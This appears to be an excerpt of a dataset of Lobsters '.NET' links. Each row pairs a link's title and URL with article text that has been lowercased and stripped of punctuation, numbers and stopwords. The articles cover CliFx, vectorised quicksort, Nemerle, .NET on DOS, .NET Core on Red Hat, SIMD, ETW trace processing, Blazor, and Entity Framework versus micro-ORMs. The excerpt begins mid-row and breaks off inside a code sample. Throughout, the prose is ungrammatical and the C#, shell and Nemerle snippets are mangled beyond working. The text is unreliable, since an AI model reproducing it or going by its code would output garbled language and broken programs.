dictionary string string act await apprunasync args envvars assert assertthat stdoutgetstring isequalto foo bar general recommendation always preferable test application level validate command execution adequately simply testing executeasync method testing endtoend also help catch bug related configuration incorrect option name parameter order environment variable name etc additionally important remember command clifx constrained text produce binary data case still use setup call getbytes instead getstring act await apprunasync args envvars assert assertthat stdoutgetbytes isequalto new byte scenario binary data may large load inmemory case recommended use virtualconsole directly custom stream debug preview mode troubleshooting issue may find useful run app debug preview mode simply pas corresponding directive app along command line argument application ran debug mode using debug directive wait debugger attached proceeding useful debugging apps ran outside ide myappexe debug cmd attach debugger pid continue preview mode specified using preview directive app shortcircuit printing consumed command line argument parsed useful troubleshooting issue related command routing argument binding myappexe preview cmd foo option parser preview cmd foo option also disallow directive eg running production calling allowdebugmode allowpreviewmode method cliapplicationbuilder var app new cliapplicationbuilder addcommandsfromthisassembly allowdebugmode true allow debug mode allowpreviewmode false disallow preview mode build environment variable option configured use value environment variable fallback value option directly specified argument extracted environment variable instead example required option either provided directly extracted environment command public class authcommand icommand commandoption token isrequired true environmentvariablename authtoken public string authtoken get set public valuetask executeasync iconsole console consoleoutputwriteline authtoken return default env authtoken test myappexe test environment variable used fallback option enumerable type case value variable split pathpathseparator window linux benchmark clifx execution overhead compare library oswindows intel core cpu haswell cpu logical physical core hz n timertsc net core host net core coreclr corefx ryujit defaultjob net core coreclr corefx ryujit method mean error stddev ratio ratiosd rank commandlineparser u u u clifx u u u clipr u u u mcmasterextensionscommandlineutils u u u systemcommandline u u u powerargs u u u cocona u u u etymology clifx made cli command line interface fx framework pronounced cliff ex
82,Lobsters,dotnet,"C#, F#, .NET programming",This Goes to Eleven (Part 1/6),https://bits.houmus.org/2020-01-28/this-goes-to-eleven-pt1,go eleven part,let small commotion took nosedive entire improvement coreclr fast quicksort implementation using avx instruction part part quicksort crash course word partition partitioning left final tony hoare code michael bostock mbostock visualizing quicksort recursion two red green visualizing quicksort comparisonsswaps animation arraysort v quicksort introspective sort david musser single comparing scalar variant benchmarkdotnet verify warmed next post,let let get ring show intrinsics really nontrivial problem even discus potential improvement future coreclr version could bring table everyone need sort array many algorithm take granted rely think solved problem nothing done except waiting newer marginally faster machine popup however case first thought best implementing join rather long journey end replacement function arraysort written pure c outperforms coreclr c code factor north modern intel cpu north laptop sound interesting rabbit hole note final day posting series intel started seeding cpu microcode update iswas affecting performance released version coreclr quite considerably managed stir small commotion unraveling benchmark happened code coincidentally le affected change coreclrs arraysort took nosedive let never said nothing le chivalrous rolled back microcode update entire series going run much faster version arraysort reader probably using assuming update machine time time technically inclined whole footnote doublecheck machine actually running also opened two issue coreclr repo attempting mitigate coreclrs c code separately jit ifwhen movement front microcode running become le issue begin add another level unwarranted complexity life back reading post stephen toub improvement coreclr became apparent hardware intrinsics common many many part coreclr could still sped technique one thing led another decided attempt apply hardware intrinsics larger problem previously done order see could rise challenge decided take array sorting see far go came eventually would become rewrite arraysort hardware intrinsics fortunately choosing sorting focusing quicksort make great blog post series since everyone familiar domain even original sorting bread butter learning computer science really quicksort queen sorting algorithm relatively easy explainrefresh original make make anywhere idea started searching various keywords found interesting paper titled fast quicksort implementation using avx instruction shay gueron vlad krasnov title alone made think walk park initially promising good enough dropin replacement arraysort reason shortly go ended lot fun expanding basic approach submit proper pullrequest start discussion coreclr devs integrating code main dotnet repository let talk sorting since lot go split le part part start refresher quicksort compare arraysort need refresher skip get right part onwards recommend skimming mostly got excellent visualization back everyone mind deal vectorization optimization later part go basic vectorized hardware intrinsics vector type go handful vectorized instruction use part still sorting anything part go initial code vectorized sorting start seeing payoff finish agonizing courtesy cpu branch predictor throwing wrench attempt part go handful optimization approach attempted trying get vectorized partitioning run faster see worked part see almost get rid remaining scalar code implementing smallconstant size array sorting use drum yet vectorization finally part list outstanding stuffideas getting juice functionality vectorized code quicksort crash course quicksort deceivingly simple really line c whatever language sort number lot incredibly fast however try change something nudge wrong way quickly turn around teach lesson humility hard improve without breaking tenant built upon word discus let describe quicksort word code picture statistic us divideandconquer approach word recursive performs mathcal nlog n comparison sort n item performs inplace sort last point referring inplace sorting sound simple neat sure perspective user additional memory allocation need occur regardless much data sorting great spent day trying overcome correctness performance challenge arise specifically context vectorization also essential remain inplace since intend become dropin replacement arraysort concretely quicksort work like pick pivot value partition array around pivot value recurse left side pivot recurse right side pivot picking pivot could minipost context competing arraysort need dive copy whatever coreclr get life coreclr us pretty standard scheme medianofthree pivot selection summed let sort element first middle last position pick middle one three pivot partitioning array spend execution time take selected pivot value rearrange array segment handed u number smallerthan pivot beginning left particular order amongst come pivot final resting position following element greaterthan pivot particular order amongst partitioning complete recurse left right pivot previously described get million billion number sorted inplace efficiently know year invention bonus trivia point still tony hoare invented quicksort back early also took responsibility inventing null pointer concept guess really good without evil world code void quicksort int item quicksort item itemslength void quicksort int item int left int right left right return int pivot pickpivot item left right int pivotpos partition item pivot left right quicksort item left pivotpos quicksort item pivotpos right int pickpivot int item int left int right var mid left right left swapifgreater ref item left ref item mid swapifgreater ref item left ref item right swapifgreater ref item mid ref item right var pivot item mid int partition int array int pivot int left int right left right array left pivot left array right pivot right left right var array left array left array right array right return left say deceptively simple grasping quicksort really work sometimes feel like trying lift sand finger end included two visualization quicksort derivative amazing work done michael bostock mbostock visualizing quicksort recursion one thing keep mind data partitioned overandover many time evershrinking partition size end partition size case trivially sort partition asis return help see better use way visualizing array intermediate state quicksort see unsorted array element process getting sorted different stick represent number range angle individual stick represents value hope easy discern represent pivot two color red currently selected pivot given recursion level green previous pivot already partitioned around previous roundslevels recursion ultimate goal go messy image visually appeasing one follows static eg nonanimated visualization show pivot randomly selected level recursion next step unsorted segment around become partitioned finally completely sorted array whole thing look visuals autogenerated javascript feel free hit reload button andor change number element array feel want see new set random stick sorted encourage look try explain quicksort every level witness interaction pivot selection land next recursion level row future pivot left right next level recursion also see every level recursion partition size decrease finally every element pivot mean sorting complete visualizing quicksort comparisonsswaps visualization really lot help understand quicksort work also wanted leave impression total amount work done quicksort animation whole process go array slowly recursively going unsorted mess completely sorted array witness many comparison swap operation need happen element quicksort complete successfully genuinely lot work need happen per element considering repartition virtually element whole thing finish arraysort v quicksort important note arraysort us couple trick get better performance avoid certain darkspots come quicksort would irresponsible mention since later post borrow least one idea playbook improve upon intrinsics arraysort strictly quicksort variation called introspective sort invented david musser roughly combine quicksort heapsort insertionsort dynamically switching specifically start quicksort may switch heapsort recursion depth go beyond specific threshold also switching insertionsort size partition go different threshold hybrid approach clever way mitigating two biggest shortcoming quicksort alone quicksort notorious degenerating mathcal various edgecases input sequence go deeply think array made single repeated number extreme case partitioning result bad separation around pivot eg one subpartition always size partitioning attempt whole thing go south quickly introspectivesort mitigates bad case tracking current recursion depth v acceptable worstcase depth usually mathcal floor log n measuredactual depth cross threshold introspectivesort switch internally partitioningquicksort heapsort deal case better average lastly partition small enough introspectivesort switch using insertionsort critical improvement consider recursive call never cheap even code present later series coreclrc threshold selected element hybrid approach manages replace level recursive call mathcal partitioning call average single call insertionsort effective small input size anyway impact optimization recursion replaced simpler loopbased code overstated mentioned ended borrowing last idea code issue around smaller partition size exacerbated using vectorized intrinsics following post unfriendly case mentioned vectorized approach yet ok kind intention making blog series however problem admitting weaseling way pit despair direct way use logic introspectivesort us switching heapsort trigger depth exceeds dynamically computed threshold inturn switch arraysort let stumble bit input give switch internally heapsort slightly nasty comparing scalar variant new information good time measure couple different scalar eg nonvectorized version compare arraysort show result generated using benchmarkdotnet bdn arraysort baseline managed code presented version basic quicksort using regularsafe c version every time access array element jit insert boundschecking machine code around actual access ensures cpu readwrite outside memory region owned array unmanaged alternativefaster version scalar code us native pointer unsafe semantics using c new unmanaged constraint neat switch insertionsort copypasted coreclr element like arraysort prepared last version show unsafe code insertionsort remove performance gap c c type code mainly stem boundschecking jit elide sort randomaccess pattern well jumpto insertionsort optimization note throughout series benchmark sorting method various array size bdn parameter n added custom column bdn column report time n represents time spent sorting per element array useful compare result uniform scale addition start purely randon unique set value classical input type want focus series actually get submitting pr show test case prove whole thing crumble input le optimal outside scope series result form chart table included handy large button press get quick tour tab contains chart scaling performance various implementation compared arraysort ratio chart showing time spent sorting single element array n element time n bdn result friendly table form statisticscounters teach u actually going hood methodname problemsize time element n scaling measurement methodname problemsize maxdepth partition avgsmallsortssize databasedbranches smallsortdatabasedbranches osclearlinuxos intel core cpu kaby lake cpu logical physical core net core host net core coreclr corefx ryujit jobdearts net core coreclr corefx ryujit grep steppingmodelmicrocode proccpuinfo head model model name intel r core tm cpu stepping microcode surprisingly unmanaged c version running slightly faster arraysort one caveat outperforms c version large input otherwise everything expected purely managed variant slow unamanged one mostly par arraysort c implementation written verify get arraysort like performance c running faster input size cut want much faster equally important reason reimplementing basic version sprinkle statisticscollectingcode magic fairy dust even number dig statistic tab counter assist u deciphering comparing future result implementation post serve u establishing baseline see per n value commentary maximal recursion depth note unmanaged version like coreclr arraysort switch insertionsort last couple recursion level therefore maximal depth smaller total number partitioning operation performed le recursion le partitioning call average size colloquially refer smallsort operation performed eg insertionsort unmanaged variant managed version unmanaged version see consistent value given special case code upper limit seems like reasonable outcome number branch operation userdata dependent one may hard relate first becomes apparent crucial number track starting post onwards definition statistic count many time code branch operation whose condition depended unsorted user supplied data number boggle mind first time get show much work involved even surprising unmanged variant number even higher well surprising know anything insertionsort yet version seems run entire post dedicated part problem series let make note already see peculiar thing finally also included statistic show percent databased branch came smallsort operation managed variant see large part compare coming last level recursion converted statistic remain pretty much rest series regardless next future version others radically change observe make use key input helping u figure howwhy something worked warmed spent quite time polishing foundation concerning quicksort arraysort know lengthy introduction somewhat dull think time spent post pay dividend next encounter actual implementation post later might also time confess legwork provide refresher helped come least one super nontrivial optimization think keep lid way final post never underestimate importance covering basic write vectorized code need pick knowhow specific vectorized intrinsics introduce select intrinsics using excellent time break post grab fresh cup coffee head next post
83,Lobsters,dotnet,"C#, F#, .NET programming",Nemerle programming language official site,http://nemerle.org/About,nemerle programming language official site,general information supported paradigm objectoriented programming functional programming metaprogramming componentoriented programming dsloriented programming language oriented programming type system static typing strong typing inferred nominal influenced c ml lisp supported platform cli net mono key feature type inference metaprogramming objectoriented programming functional programming ide support screenshot macro library nemerlepeg nemerlexml xmlliterals computation expression nemerle rail well groovy,programming language special force developer nemerle generalpurpose multiparadigm programming language net platform easy learn use c vbnet nemerle far powerful one may start using advanced c learning go employ range cool feature enabling metaprogramming functional programming metaprogramming based macro bearing similarity lisp general information supported paradigm objectoriented programming oop functional programming fp metaprogramming mp componentoriented programming cop dsloriented programming dop language oriented programming lop type system static typing strong typing inferred nominal influenced c oop imperative support ml fp support lisp macro support supported platform cli net mono key feature type inference nemerle infer type initialization usage def dict dictionary dude type params dictadd key type params infered usage def thetype dictgettype writeline thetype def expected typeof dictionary string int traceassert thetypeequals expected metaprogramming flexible powerful metaprogramming subsystem using nemerle macro def title programming language author def author anders hejlsberg simon peytonjones xml macro nemerlexmlmacro library alows inline xml literal nemerlecode def html xml html head title title title head body ul authorsany li foreach author author author li ul body html traceassert htmlgettype equal typeof xelement writeline htmlgettype objectoriented programming full support oop familiar c java c programmer module program class initializer public name string get set public event hellohandler action string public sayhello void hellohandler invoke hello name public static test void def hellower initializer name david hilbert hellohandler consolewriteline hellowersayhello main void initializertest functional programming full support functional programming inherited ml family language ml ocaml f haskell solve problem quick easy also beautiful higherorder function local function lambda tailcall elimination optimization pattern matching algebraic type tuples anonymous type partial application function def factorial n acc acc factorial n n acc def partedfactorial factorial consolewriteline partedfactorial ide support presence integration visual studio allows reducing threshold entry current nemerle studio ide integration support language feature including information derived type macro expansion screenshot macro library macro allow raise level program unprecedented height without sacrificing richness language syntax lisp develop macro simplify solution every day task one nemerle paradigm languageoriented programming lop new approach software development lop allows create domain specific language dsl solve problem describing completely declarative manner macro allow implement maintain dsl macro allow getting automatic support ide much faster easier using macro get high speed generated code etc standard distribution nemerle compiler includes lot readytouse macro easily extended thirdparty developer following outstanding solution implemented help nemerle macro nemerlepeg implement generator parser based peg notation notable advantage ease use using nemerlepeg easy using regular expression incredibly high speed work produced parser mb sec grammar c construction ast dynamic extensibility rule grammar may included fly support left recursion associativity intellectual memoization integration pratt algorithm support syntactic predicate allows easily parse c c style language scope support allows parse number contextsensitive language like ccnemerle separation grammar semantic action intellisense ide support realtime error reporting navigation nemerle macro system based nemerlepeg nemerlexml xmlliterals allows using xml quasiquotes inside nemerlecode xmlliterals allow active area control structure feature analogous language like scala vbnet available separate module macro source code xmlliterals support inline operator foreach unless computation expression give similar possibility f language computation expression beautiful syntactic sugar monad greatly simplifies creation feature like comp async parallelization code execution comp enumerable generating sequence inside expression nemerle rail library nemerle macro rail analog ruby rail statically typed language world statically typed language framework scala lift implementation nemerle based macro recognized standard linq well small macro make code shorter clearer late late binding lazy deferred execution logging profiling record automatic creation constructor initialize field surroundwith fast creation operator similar using well splicestrings ruby style active string implemented using macro linq support feature also implemented using macro extended operator groovy safe navigation operator swap operator macro allows walk complex data structure similar using visitor pattern without manual work macro automate implementation oop design pattern abstract factory pattern aggregation composite proxy singleton dependencyproperty easily help implement wpf property aop support aspectoriented programming
84,Lobsters,dotnet,"C#, F#, .NET programming",.NET everywhere apparently also means Windows 3.11 and DOS,https://www.hanselman.com/blog/NETEverywhereApparentlyAlsoMeansWindows311AndDOS.aspx,net everywhere apparently also mean window do,michal strehovský running c window tweet thread messageboxa result running c do selfcontained net core executables michal wanted see small could go textmode think great illinker michal go rail stub reimplementation system base type follow michal twitter sponsor try jetbrains rider today hosting,often talk net core open source run everywhere monogame unity apple watch raspberry pi microcontrollers well dozen linux window etc lot place michal strehovský want c run everywhere love recently got c code running two impossible place added definition everywhere fun experiment nt production underscore flexibility michals technical ability underlying platform running c window tweet thread michael talk got c running window app simple calling messageboxa window since day using dllimportpinvoke call messagebox receive result showing window app first cool started do experiment left compiling c native code done break kind rule example running however alive coding used project bridge technology called subset apis window nt backported window form given limitation could write bit code thunk michal learned object file coretr aot ahead time compiler linked linker visual c result native code link run ish window magical kudos michal running c do blogged selfcontained net core executables huge fan got app meg small measurement given includes net runtime lot accoutrement certainly one nt judge vmruntime hello world size michal wanted see small could go byte goal using textmode think great also remove need garbage collector using common technique allocation allowed mean ca nt use new anywhere reference type us thing like fixed char field declare fixed array remembering must live stack stack small course dotnet publish something selfcontained initially get meg ish exe includes app runtime standard librariesdotnet publish r c release use illinker publishedtrimmed use net core tree trimming get meg try using mono mkbundle get meg hit bug still got runtime runtime nt runtime corert includes virtual machine function support youdotnet publish r c release p modecorert get meg still big tweak go meg pull reflection entirely get meg fit floppy dotnet publish r c release p modecorertreflectionfree one megabyte size seems hardish limit net sdk michal go rail make stub reimplementation system base type recompiles magic switch get il version execscexe debug noconfig nostdlib runtimemetadataversion minibclcs gameframebuffercs gamerandomcs gamegamecs gamesnakecs palthreadwindowscs palenvironmentwindowscs palconsolewindowscs zerosnakeilexe langversion latest unsafe feed coreit get native codeilcexe zerosnakeilexe zerosnakeobj systemmodule zerosnake o g yada yada yada zerosnakeobj standard object file different object file produced native compiler c c last step linking tweak pull linker switch disable strip various thing using technique native developer use result byte epiclinkexe debug full subsystem console zerosnakeobj entry managedmain ucrtlib merge modulesrdata merge pdatardata incremental dynamicbase coolest craziest place ever run net code go follow michal twitter give applause sponsor like c developed fast smart crossplatform net ide give even coding power clever code analysis rich code completion instant search navigation advanced debugger jetbrains rider everything need fingertip code c speed thought linux mac window try jetbrains rider today hosting
85,Lobsters,dotnet,"C#, F#, .NET programming",.NET Core on Red Hat platforms,https://developers.redhat.com/blog/2020/01/17/net-core-on-red-hat-platforms/,net core red hat platform,net core red hat platform platform overview operating system fedora red hat enterprise linux centos centos stream nocost red hat developer subscription container universal base image registryredhatio registryaccessredhatcom registrycentosorg openshift red hat openshift kubernetes red hat codeready container red hat container development kit net core platform net core fedora fedora net special interest group fedora net documentation net core red hat enterprise linux centos red hat subscription management system net core getting started guide net core red hat enterprise linux newer rhel net core getting started guide net core container note github repo net core getting started guide net core openshift sourcetoimage github repo registry authentication note installing net core getting started guide conclusion,net core red hat platform article look various way net core made available red hat platform start overview available platform show install net core platform overview let start overview familiar platform already skip section cover specific platform operating system operating system point view look four distribution fedora community maintained distribution move fast great option developer want access latest development tool latest kernel red hat enterprise linux rhel longterm support lts distribution red hat based fedora centos community maintained downstream rebuild red hat enterprise linux centos stream rolling preview distribution future red hat enterprise linux version distribution free freedom software available open change fedora centos cost free beer red hat enterprise linux pay support subscription red hat development purpose however use nocost red hat developer subscription download red hat enterprise linux well product tool cost container public cloud vendor support creating red hat enterprise linux centosbased virtual machine vms vms based rhel supported red hat vms based centos supported centos community container technology operating system also packaged container image image contain package o kernel red hat provides red hat enterprise linux rhel image red hat enterprise linux image based universal base image ubi red hat enterprise linux image provided ubi image others nonubi image rhel nonubi image hosted registryredhatio require subscription credential pulled ubi image hosted registryaccessredhatcom require subscription download image may used production without red hat subscription platform however ubi image run red hat enterprise linux platform subscriber get support red hat centos community also provides image hosted registrycentosorg openshift running containerbased application red hat provides red hat openshift based kubernetes kubernetes provides core functionality scheduling container across multiple machine openshift package kubernetes form usable deployable maintainable red hat provides supported version openshift deployed onprem public cloud eg azure aws gcp red hat openshift based open source upstream okd project run openshift development machine use red hat codeready container crc openshift red hat container development kit cdk openshift net core platform let take look install net core onto red hat platform net core fedora net core fedora built fedora net special interest group sig net core meet fedora packaging guideline distributed separate repository install net core fedora need enable copr repository install sdk package sudo dnf copr enable dotnetsigdotnet sudo dnf install possible sig also build preview version net core preview version distributed separate repository sudo dnf copr enable dotnetsigdotnetpreview sudo dnf install information running net core fedora see fedora net documentation net core red hat enterprise linux centos red hat enterprise linux centos net core version packaged software collection scls method packaging allows net core include library newer provided base o install net core red hat enterprise linux machine need registered red hat subscription management system depending o flavor eg server workstation hpc compute node need enable proper net core repository sudo subscriptionmanager repos sudo subscriptionmanager repos sudo subscriptionmanager repos next scl tooling need installed sudo yum install sclutils install specific version net core sudo yum install use net core scl first need enable example run bash scl running scl enable bash information running net core red hat enterprise linux see net core getting started guide net core red hat enterprise linux newer rhel net core included appstream repository enabled default version net core installed running sudo dnf install information running net core red hat enterprise linux see net core getting started guide net core container two image provided per different net core version runtime image contains everything necessary run net core application sdk image contains runtime plus tooling needed build application table show name image net core version change version number name table net core image version base image sdkruntime image latest latest note depending version image might yet available specific base example centos image made available centos community red hat enterprise linux image created red hat following example print sdk version available net core image podman run dotnet version information net core image see github repo net core getting started guide net core openshift net core image provide environment running building net core application also compatible openshift sourcetoimage build strategy factor mean openshift container platform build net core application source net image imported openshift using openshift cli client oc image stream definition file github repo file differs depending base image shown table table net core image stream definition base image base image image stream definition http http http retrieving red hat enterprise linux image requires authentication registry authentication describes set pull secret image stream imported using oc example import image run oc create f http note already image stream present net core must use replace instead create repository includes script installing image stream window linux macos see installing information script also create pull secret needed pulling red hat enterprise linux image image stream installed openshift directly build deploy application git repo example oc newapp contextdirapp information using net core openshift see corresponding chapter net core getting started guide conclusion article got overview red hat platform support net core install net core related
86,Lobsters,dotnet,"C#, F#, .NET programming",Optimizing string.Count all the way from LINQ to hardware accelerated vectorized instructions,https://medium.com/@SergioPedri/optimizing-string-count-all-the-way-from-linq-to-hardware-accelerated-vectorized-instructions-186816010ad9,optimizing stringcount way linq hardware accelerated vectorized instruction,vectorized instruction anyway simd instruction double int float ushort short byte sbyte int int int vector vector vector count,vectorized instruction anyway vectorized instruction often called simd instruction single instruction multiple data instruction leverage special register modern cpu speedup certain type operation register hold series value next single operation executed timeone important thing note size simd register depends specific processor also influence number value hold time precise different simd instruction work different simd register specific size c apis use provide nice abstraction expose register u vector type vary size depending specific device executing code instance bit register disposal able store either double value bit int float value bit ushort short value bit byte sbyte value bit simd register might also available always manually check whether case executing vectorized codesuppose two int array wanted write another int array size sum pair value instead going element one one could load chunk consecutive value array two separate simd register sum register together single instruction copy resulting register right location int array return method type need vector represents simd register element given type sample traditional implementation algorithm using loop one using vector vector apis proof concept move implementation original count method leverage power simd instruction
87,Lobsters,dotnet,"C#, F#, .NET programming",Bulk ETW Trace Analysis in C#,https://randomascii.wordpress.com/2020/01/05/bulk-etw-trace-analysis-in-c/,bulk etw trace analysis c,wrote trace processor trace processor preview identifychromeprocessespy stack allocation heap snapshot sample code heap snapshot trace pair heap snapshot performance accuracy flexibility thing watch conclusion uiforetw reference like,etw trace record wealth information window system behaving analyzing new unknown problem replacement loading trace wpa following clue solution thrill hunt creative challenge finding visualization reveal root cause never get old nerdy sorry enjoy sometimes want extract commonly found piece information multiple trace manually tedious error prone initially solution run xperf action xperf help processing parse output work well enough action map well information want next option wpaexporter wrote wpaexporter set summary table way want export data csv file infinitely flexible setting wpa profile bit fussy setting json file needed want efficiently export multiple profile even worse csv processing something rather avoid finally something better trace processor may microsoft announced trace processor preview nuget package microsoftwindowseventtracingprocessingall make easy write robust efficient etw trace processing code c used experimental project real work found easy way programmatic analysis etw trace uiforetw ship trace analysis script use oldschool xperf action one first experiment rewrite one using trace processor preview chose rewrite identifychromeprocessespy c relearn c let know anything wrong learn trace processing api quite easy due intellisense despite minimal documentation overall project went smoothly basic pattern analyzing trace start calling traceprocessorcreate using itraceprocessor trace traceprocessorcreate tracename call traceusexxx type data want use return ipendingresult xxx type dozen type data available listed announcement page available intellisense call traceprocess scan trace read requested data grab result ipendingresult object like var pendingschedulingdata traceusecpuschedulingdata var pendingsamplingdata traceusecpusamplingdata traceprocess convert pending actual data var schedulingdata pendingschedulingdataresult var samplingdata pendingsamplingdataresult iterate data whatever way want something like var exectimes new dictionary iprocess cpuusagedetails scan contextswitch data build much time spent process foreach var slice schedulingdatacputimeslices yep happens sliceprocess null continue exectimestrygetvalue sliceprocess cpuusagedetails last lastns slicedurationnanoseconds lastcontextswitches exectimes sliceprocess last stack many etw event contain call stack includes context switch event cpu usage precise data sample cpu usage sampled data allocation heap snapshot potentially many event stack crucial understanding data trace processor support handling call stack following pattern data type supported trace processor invoke traceusesymbols indicate want load symbol calling traceprocess retrieving pending symbol result need load symbol loadsymbolsasync followed immediately waiting result really async like var pendingsnapshotdata traceuseheapsnapshots var pendingsymbols traceusesymbols traceprocess var snapshotdata pendingsnapshotdataresult var symbol pendingsymbolsresult symbolsloadsymbolsasync new symcachepath c symcache getawaiter getresult done traverse stack event call getanalyzerstring similar stack individual entry published sample code comparing heap snapshot trace pair heap snapshot also made available order test code performance simplest type report listing chrome process tree python script consistently faster however complex report listing cpu usage process c tool typically three eight time faster simple report quick generate either way minor trace processor performance regression much matter significant trace processor speedup expensive report quite welcome cpuusage case python script forced process trace twice commandline information cpu usage data whereas c code process however enough explain speedup may time generate parse large quantity text difference ultimately really matter accuracy tested new tool etw trace squirreled away make sure handling edge case processtree result get identical except truly weird trace somehow ended impossible process hierarchy cpu usage case small discrepancy bit discussion team determined due thread running beginning end trace difference probably avoidable tiny bother flexibility ultimate benefit using trace processing api explore data anyway want without parse multiple csv file even process trace lost event time inversion wary weird result wpaexporter let see sample code link example thing watch aware first time use trace processor message printed case message ending output like trace processor team added property traceprocessorsettings called suppressfirsttimesetupmessage used stop printing trace huge analyzing trace whether wpa trace processing system consume lot memory especially loading making sure lot memory crucial laptop gb also need make sure c code running process unfortunately default visual studio net framework run c code process maximum address space gib therefore create new trace processing project go project property build tab uncheck prefer conclusion cpu usage summary identifychromeprocessescs enough faster tempted switch c tool get benefit switching c would also avoid dependency python installed far guaranteed window trace processing api feel like powerful way bulk trace processing want repetitive analysis etw trace reach trace processor package usually create custom analysis tool extremely quickly day want add feature uiforetw run tool script multiple trace look newly discovered pattern old trace performance flexibility trace processing api make tempting reference best way learn trace processor api look sample basic pattern look available type data start writing code like like loading related
88,Lobsters,dotnet,"C#, F#, .NET programming",How Blazor Is Going to Change Web Development,https://hackernoon.com/how-blazor-is-going-to-change-web-development-y32i3zvw,blazor going change web development,blazor going change web development article exactly download old way option web assembly method web assembly cool downside option blazor server cool downside big deal learn microsoft blazor site blazor big picture blazor getting started blazor authentication authorization creating blazor component let know,blazor going change web developmenttech blogger author overall geek love tech love writing couple week ago wrote article building deploying blazor app without touching window machine realized maybe take step back explain blazor anyone would use still fairly new front end development world awesome check exactly blazor framework microsoft use develop interactive clientside web uis c word blazor let build interactive web uis using c instead javascript blazor apps composed reusable web ui component implemented using c html cs client server code written c allowing share code library pretty cool right download get started old way remember old way developing web application longest time built application ran solely server using thing like aspnet php etc generated html file pushed browser always bit interactivity javascript ajax many year business logic handled server spitting html page interact browser many year glorified document viewer worked knew could better downside pattern aware server need configured software run web app aspnet php etc backend processor runtimes exist server processing power server page load annoying slow found new answer rise single page application new pattern framework like angular react vue building full application javascript run browser split business logic run browser run server javascript application run clientside use messaging communicate server easily replace server service application cloud model still excellent improvement essentially manipulating html tossing back forth real application running browser page load mostly thing past blazor improves pattern two main way develop option web assembly method choose build blazor web assembly application look like blazor us web assembly ship major browser web assembly binary instruction format run virtual environment browser really mean browser act host application file built blazor web assembly application compiled sent browser browser run javascript html c execution sandbox browser even run version net runtime mean execute call net within browser fullyfledged application browser even run offline cool run static file server nginx i apache heroku etc run j bytecode run c nearnative speed use c develop rich frontend application web assembly ship major browser reuse net component use microsoft tooling debugging great low latency application game need communicating server nt need download application run offline browser great game thing need run lightning fast browser downside net framework runtime file need downloaded one time restricted capability browser secret credential api key etc downloaded locally net framework component compatible may ideal application good news another blazor pattern use option blazor server decide build blazor server application look like closer model using today build application server powered net core send html javascript browser act client great way make screaming fast thin client cool get full power net framework everything rest server small downloads web assembly required secret safe downside offline application requires server running net core service high latency lot network traffic choose one use want powerful clientside application run offline served static server choose blazor web assembly want full power net want run model thin client choose blazor server big deal blazor pattern open big opportunity development whether want build powerful service several thin client cool interactive game run browser blazor enables rich interactive application potential web assembly way future enables nearnative speed browser us common interface find web assembly pc phone tablet bunch c developer team nt front end programming empowered language love pretty awesome excited see blazor progress learn learn microsoft blazor site want dig deep learn blazor pluralsight modern course get running quickly blazor big picture blazor getting started blazor authentication authorization creating blazor component try let know think blazor share experience comment subscribe get daily roundup top tech story
89,Lobsters,dotnet,"C#, F#, .NET programming","The argument against Entity Framework, and for micro-ORMs",https://pknopf.com/post/2019-09-22-the-argument-against-entity-framework-and-for-micro-orms/,argument entity framework microorms,preface entity framework core servicestackormlite note surface areaexposure missing feature migration change tracking unit work lazy collection misc final word update sharpdataaccess,preface worked entity framework since net day codefirst databasefirst well latest net core version preferred solution gotten pretty good looking back regret learn hard way ef taxing nt good choice solution many orms net world think point could made picking one fullyfledged orm micro orm full orm entity framework core chosen unofficial official version net frontandcenter getting started doc junior devs choose beginning journey net micro orm servicestackormlite sake argument could easily chosen solution dapper petapoco fan apifeatures servicestackormlite provides note ormlite free opensource paid closedsource surface areaexposure picking dependency project must step back take view thing determine impact solution one way consider size dependency via linesofcode using cloc overview size codebase purely considering linesofcode fool errand story saying go money problem right increase surface area including dependency graph increase chance running bugsissues sit top layer abstraction indirection problem begin run begin get cryptic harder isolatefix get sense spending minute issue page orm find issue ormlite generally problemdomain getting data inandout database underlying ado provider whereas issue ef generally involve layerstypes involved abstraction come scope dependency exposure brings project would nt take point lightly often overlooked eventually tax solution go unnoticedunrealized ca nt escape issue getting data underlying database however huge swath issue completely avoided choosing expose smaller target harder hit keep dependency small micro orms usually extension top raw ado type idbcommand idbconnection etc ormlite exception extension usually go far prevent user manually manage sql string obvious maintenance nightmare point abstraction real complaint made get fully typechecked access underlying database relationship type data represent data type pocos expressed clearly magic voodoo secret table mapping manytomany relationship complex graph management virtual proxy lazy collection navigation property leaked thing usually end adding friction project caking additional feature silently tax exception happen using ormlite micro orms usually result underlying ado provider key constraint etc better closer metal issue arises causefix usually clear common misconception bare metal need boilerplate nt true mean case working http raw tcp connection course want higherlevel abstraction nt case ormlite micro orms general wager get fewer line code using ormlite ef let say business requirement storingretrieving data ruled need nonconventional database graph cassandra etc decided relational database work following code illustrates bare minimum needed tackle problem using ormlite class program public class person autoincrement public int id get set public string name get set public static void main string var factory new ormliteconnectionfactory memory sqlitedialectprovider using var db factoryopendbconnection dbcreatetable person var person new person name paul var personid dbsave person using var trans dbopentransaction isolationlevelreadcommitted person dbsingle dbfrom person x xname paul person dbsinglebyid person personid personname another name dbsave person transcommit business requirement achieved code little way prevent defining solutionarchitecture like ormlite micro orms focus exactly needed solve problem nothing nothing le brings next point heavy orms impose artificial abstraction force unique style development introducing disconnect layer indirection code database requiring usage usage augmented proxied efspecific model using abstraction nt going make better oop fp programmer make knowledable sql rdbmsspecific feature sitting ef layer limit ability clearly perdict behavior functionality query instead relying efspecific behavior make harder reason code need keep hidden context incidental complexity ef behavior reviewing code know exactly ef diagnosting unwanted behavior like unintended data access missing feature believe set high bar point come choosing ef ormlite nt factor additional feature developer come love ef migration change tracking unit work lazy collection navigation property join projection result caching graph persistence list go opinion feature unlikely address business concern directly however still typically highly valued developer various reason feature must carefully considered even wo nt usebenefit feature still cost exist typically exist heavy orms ef found enterprise language javanet prefer code againt clean apis lerverage db underlying functionality feature said let try address feature migration migration requirement every solution thing consider first nt write code nt mean someone nt write code choosing batteriesincluded approach nt make solution simpler put engine hood trunk still break secondly choosing batteriesincluded approach onesizefitsall solution often mean additional edge case usecases nt apply may seem irrelevant even using feature nt mean nt sitting abstraction needed specifically needed nt need lastly happens something go wrong thing lot easier debugfix solution nt white noise happens run issue like time spent debugging fixing database migration failed point already spent time using feature nt implement would taken implement migration seriously write migration layer wrote minute class program public interface imigration void run idbconnection connection int version get public class migrator private readonly ormliteconnectionfactory connectionfactory private readonly ilist imigration migration public migrator ormliteconnectionfactory connectionfactory ilist imigration migration connectionfactory connectionfactory migration migration public void migrate using var connection connectionfactoryopendbconnection connectioncreatetableifnotexists migration var installedmigrations connectionselect migration using var transaction connectionbegintransaction foreach var migration 